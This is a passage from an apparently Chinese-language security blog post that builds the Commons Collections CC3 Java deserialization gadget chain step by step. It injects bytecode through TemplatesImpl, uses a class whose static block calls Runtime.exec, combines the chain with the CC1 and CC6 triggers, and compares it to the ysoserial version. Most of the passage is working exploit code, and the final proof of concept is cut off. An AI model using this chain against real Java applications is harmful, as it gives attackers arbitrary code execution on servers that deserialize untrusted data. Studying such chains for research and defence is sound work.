com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519195412264.png" alt="image-20240519195412264"></p><p>运行会报错</p><p>这里大意了, 在类中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>一个是一个二维的数组</p><p>因此我们需要改写一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519201358854.png" alt="image-20240519201358854"></p><p>之后这里仍然会报错, 我们跟进调试一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519202511737.png" alt="image-20240519202511737"></p><p>问题出在了这里, 这里进入了419行, 将_transletIndex赋值成了小于一的数, 导致进入428行抛出错误</p><p>为了避免进入419行, 我们加载的类必须满足其继承<code>ABSTRACT_TRANSLET</code>这个类, 我们点进去可以看见</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519202807342.png" alt="image-20240519202807342"></p><p>因此我们只需要恶意继承一下即可</p><p>我们修改要加载的类为:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 继承AbstractTranslet必须重写以下方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译好后运行我们的demo,</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519203400370.png" alt="image-20240519203400370"></p><p>这里仍然会看到报错, 但是已经成功了!</p><p>但是目前这条链子仍然受限于需要newTransformer()的调用这一先决条件</p><p>我们可以使用CC1的链子来调用这个newTransformer()方法,从而触发任意类加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;CC3.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接把之前的拼起来, 成功执行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519205440576.png" alt="image-20240519205440576"></p><p>当然可以看配合CC6</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;CC3.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比分析Ysoserial</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519225316834.png" alt="image-20240519225316834"></p><p>这里有些许不同, 它使用了<code>InstantiateTransformer</code>而不是<code>InvokerTransformer</code>来调用<code>newTransformer</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519231447711.png" alt="image-20240519231447711"></p><p>可以看见<code>InstantiateTransformer</code>是用来调用构造函数的, 而不是<code>InvokerTransformer</code>那样执行任意方法</p><p>我们再看<code>TrAXFilter</code>这个类, 它的构造函数中正好调用了<code>templates.newTransformer()</code>方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519231136720.png" alt="image-20240519231136720"></p><p>因此即可触发cc3链条</p><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span 